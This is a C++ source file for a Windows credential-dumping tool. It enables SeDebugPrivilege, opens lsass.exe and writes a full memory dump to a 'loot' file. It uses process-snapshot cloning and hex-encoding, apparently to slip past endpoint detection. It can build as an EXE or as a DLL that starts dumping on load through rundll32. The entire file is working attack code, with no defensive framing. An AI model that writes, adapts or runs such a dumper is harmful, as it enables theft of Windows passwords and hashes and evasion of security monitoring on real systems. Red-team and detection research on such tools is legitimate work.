#include "pch.h"

#define SE_DEBUG_PRIVILEGE 20

// boolean ref: https://devblogs.microsoft.com/oldnewthing/20041222-00/?p=36923
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlgetversion
EXTERN_C NTSTATUS NTAPI RtlGetVersion(PRTL_OSVERSIONINFOEXW lpVersionInformation);

// PssCaptureSnapshot typedef for GetProcAddress
typedef DWORD(__cdecl *PPssCaptureSnapshot)(HANDLE, PSS_CAPTURE_FLAGS, DWORD, HPSS*);
// PssCaptureSnapshot typedef for GetProcAddress
typedef DWORD(__cdecl *PPssFreeSnapshot)(HANDLE, HPSS);

// dump write path
const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot";

// could also use std::vector
typedef struct SmartArray {
	LPVOID buffer;
	int size;
}SmartArray;

// Windows version table https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_osversioninfoexw#remarks
// true if versions satisfy minimum Major/Minor version for Server/DomainController or Workstation
BOOL verifyRtlVersions(ULONG minMajorW, ULONG minMinorW, ULONG minMajorS, ULONG minMinorS) {
	OSVERSIONINFOEXW osInfo;
	// specifies OSVERSIONINFOW or OSVERSIONINFOEXW structure for RtlGetVersion
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);
	RtlGetVersion(&osInfo);

	if (osInfo.wProductType == VER_NT_WORKSTATION) {
		if (osInfo.dwMajorVersion < minMajorW) return FALSE;
		if (osInfo.dwMajorVersion == minMajorW && osInfo.dwMinorVersion < minMinorW) return FALSE;
	}
	else {
		if (osInfo.dwMajorVersion < minMajorS) return FALSE;
		if (osInfo.dwMajorVersion == minMajorS && osInfo.dwMinorVersion < minMinorS) return FALSE;
	}
	return TRUE;
}

// get Process ID by process name
DWORD getPID(LPCWSTR procName = L"lsass.exe") {

	// take snapshot of current process
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
	DWORD processId = NULL;

	// grab lsass.exe PID
	if (Process32First(snapshot, &entry) != TRUE) return NULL; // Check if snapshot has process information
	while (Process32Next(snapshot, &entry) == TRUE) {
		if (_wcsicmp(entry.szExeFile, procName) == 0) {  
			processId = entry.th32ProcessID;
		}
	}
    CloseHandle(snapshot);

	return processId;
}

// minidump lsass process memory to file
BOOL miniDumpLoot() {
	DWORD processId = getPID();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	BOOL cDump = MiniDumpWriteDump(hProcess,processId,hFile,MiniDumpWithFullMemory,NULL,NULL,NULL);

	CloseHandle(hFile);
	CloseHandle(hProcess);

	return cDump;
}

constexpr char hexmap[] = { '0', '1', '2', '3', '4', '5', '6', '7',
						   '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
BOOL binToHex(char *out, char *data, DWORD size) {
	for (int i = 0; i < size; i++) {
		out[2 * i] = hexmap[(data[i] & 0xF0) >> 4];
		out[2 * i + 1] = hexmap[data[i] & 0x0F];
	}
	return TRUE;
}

// callback routine for MiniDumpWriteDump to tell it to read snapshot data instead of process handle
BOOL CALLBACK MyMiniDumpWriteDumpCallback(
  __in     PVOID CallbackParam,
  __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
  __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bytesRead = 0;
	SmartArray* buff;
    switch (CallbackInput->CallbackType)
    {
		case IoStartCallback:
			CallbackOutput->Status = S_FALSE;
			break;
		case IoWriteAllCallback:
			CallbackOutput->Status = S_OK;
			// get source buffer of minidump data to be written to buffer
			source = CallbackInput->Io.Buffer;
			// get size of bytes read
			bytesRead = CallbackInput->Io.BufferBytes;

			// get buffer from callback parameter
			buff = (SmartArray*)CallbackParam;

			// check if allocation is bigger then array and resize
			if ((CallbackInput->Io.Offset + CallbackInput->Io.BufferBytes) * 2 > buff->size) {
				int oldSize = buff->size;
				int newSize = round(((CallbackInput->Io.Offset + CallbackInput->Io.BufferBytes) * 2) * 1.5);  // 1.5 multiplicative factor

				// realloc and update size
				buff->buffer = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,buff->buffer, newSize);
				buff->size = newSize;
				if (buff->buffer == NULL) {
					return FALSE;
				}

				// initalize new mem to '0'
				LPVOID zeroDestination = (LPVOID)((DWORD_PTR)buff->buffer + oldSize);
				memset(zeroDestination, '0', (size_t)newSize - (size_t)oldSize);
			}

			// get offset for write
			// **does not write sequencially**
			// **only readable bytes are provided, i.e: unused bytes in memory are not written**
			destination = (LPVOID)((DWORD_PTR)buff->buffer + ((DWORD_PTR)CallbackInput->Io.Offset*2));

			// copy from minidump buffer to buffer
			binToHex((char*)destination, (char*)source, bytesRead);

			break;
		case IoFinishCallback:
			CallbackOutput->Status = S_OK;
			break;
        case IsProcessSnapshotCallback: 
            CallbackOutput->Status = S_FALSE;
            break;
		default:
			return true;
    }
    return TRUE;
}

// ref: https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
// capture process snapshot then minidump lsass from snapshot to file
// Minimum support server: Windows Server 2012 R2
// Minimum support client: Windows 8.1
BOOL pssMiniDumpLoot() {
	DWORD processId = getPID();
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	HANDLE hFile = CreateFile(dmpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// load PssCaptureSnapshot dynamically incase program is running on incompatible system
	// delay loading will not work since function is from kernel32.dll: https://devblogs.microsoft.com/oldnewthing/20100201-00/?p=15123
	PPssCaptureSnapshot pPCS;
	pPCS = (PPssCaptureSnapshot)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "PssCaptureSnapshot");
	// load PssFreeSnapshot dynamically incase program is running on incompatible system
	PPssFreeSnapshot pPFS;
	pPFS = (PPssFreeSnapshot)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "PssFreeSnapshot");

	DWORD CaptureFlags = (DWORD)PSS_CAPTURE_VA_CLONE
                            | PSS_CAPTURE_HANDLES
                            | PSS_CAPTURE_HANDLE_NAME_INFORMATION
                            | PSS_CAPTURE_HANDLE_BASIC_INFORMATION
                            | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
                            | PSS_CAPTURE_HANDLE_TRACE
                            | PSS_CAPTURE_THREADS
                            | PSS_CAPTURE_THREAD_CONTEXT
                            | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
                            | PSS_CREATE_BREAKAWAY
                            | PSS_CREATE_BREAKAWAY_OPTIONAL
                            | PSS_CREATE_USE_VM_ALLOCATIONS
                            | PSS_CREATE_RELEASE_SECTION;
	HPSS SnapshotHandle;
	// capture snapshot of lsass process
	DWORD dwResultCode = pPCS(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
	//DWORD dwResultCode = PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)CaptureFlags, CONTEXT_ALL, &SnapshotHandle);
	if (dwResultCode != ERROR_SUCCESS) return FALSE;

	// initialize callback parameter
	SmartArray* buff = new SmartArray{
		HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 125000 * 1024), // allocate 125000 kb
		125000 * 1024
	};

	// initialize buffer with '0' chars, since minidump doesn't write unreadable process memory
	memset(buff->buffer, '0', buff->size);

	// callback info
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof (MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = MyMiniDumpWriteDumpCallback;
	CallbackInfo.CallbackParam = (PVOID)buff;
	// use callback routine to tell MiniDumpWriteDump to capture from snapshot
	BOOL cDump = MiniDumpWriteDump(SnapshotHandle,processId, NULL,MiniDumpWithFullMemory,NULL,NULL,&CallbackInfo);

	pPFS(GetCurrentProcess(), SnapshotHandle);
	//PssFreeSnapshot(GetCurrentProcess(), SnapshotHandle);

	// write encoded minidump to file
	DWORD bytesWritten = 0;
	WriteFile(hFile, buff->buffer, buff->size, &bytesWritten, NULL);

	// free buffer and delete smartarray
	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, buff->buffer);
	delete buff;

	CloseHandle(hFile);
	CloseHandle(hProcess);

	return cDump;
}

// ref: https://docs.microsoft.com/en-us/windows/win32/secauthz/enabling-and-disabling-privileges-in-c--
// win32 method of enabling access token privileges
BOOL setPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
    LUID luid;
    BOOL bRet=FALSE;

    if (LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
    {
        TOKEN_PRIVILEGES tp;

        tp.PrivilegeCount=1;
        tp.Privileges[0].Luid=luid;
        tp.Privileges[0].Attributes=(bEnablePrivilege) ? SE_PRIVILEGE_ENABLED: 0;
        //  Enable the privilege or disable all privileges.
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        {
            //  Check to see if you have proper access.
            //  You may get "ERROR_NOT_ALL_ASSIGNED".
            bRet=(GetLastError() == ERROR_SUCCESS);
        }
    }
    return bRet;
}

// set SEDEBUGPRIVILEGE in current process
BOOL setSEDebug() {
	HANDLE hProcess=GetCurrentProcess();
	HANDLE hToken;
	BOOL bRet = FALSE;

	if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		bRet = setPrivilege(hToken, SE_DEBUG_NAME, TRUE);
		CloseHandle(hToken);
	}
	else {
		return bRet;
	}
	CloseHandle(hProcess);

	return bRet;
}

// Runtime libraries enable privileges, native api method of changing privileges (undocumented ntdll function)
// returns previous debug privilege state
BOOLEAN setRtlSEDebug() {
	BOOLEAN bPreviousPrivilegeStatus = FALSE; 
    RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bPreviousPrivilegeStatus);
	return bPreviousPrivilegeStatus;
}


// ref: https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L80
// check if process is UAC elevated (does not check if System integrity or runas administrator)
BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

// if version is above minimum Windows 8.1, Windows Server 2012 R2 use pssMiniDumpLoot, else use miniDumpLoot
BOOL dumpLoot() {
	setRtlSEDebug();

	if (verifyRtlVersions(6, 3, 10, 0)==TRUE) {
		return pssMiniDumpLoot();
	}

	// if version requirement minimum is not met, dump without snapshot clone
	return miniDumpLoot();
}

// wrapper so dumpLoot can be called as type LPTHREAD_START_ROUTINE 
DWORD dumpLootThreadWrapper(LPVOID lpParameter) {
	return dumpLoot();
}

// global thead handle for dll execution
HANDLE tHandle;

// export function for rundll32
extern "C" __declspec (dllexport) void testDLL()
{
	WaitForSingleObject(tHandle, INFINITE);
}

// Change build type .DLL
// Properties->General->Configuration Type:Dynamic Library(.dll)
// SubSystem flag has no effect on DLL
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		// https://devblogs.microsoft.com/oldnewthing/20070904-00/?p=25283
		tHandle = CreateThread(NULL, 0, dumpLootThreadWrapper, NULL, 0, NULL);
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// Change build type .EXE
// Properties->General->Configuration Type:Application(.exe)
// Properties->Linker->System->SubSystem:CONSOLE
int main() {
	dumpLoot();
}
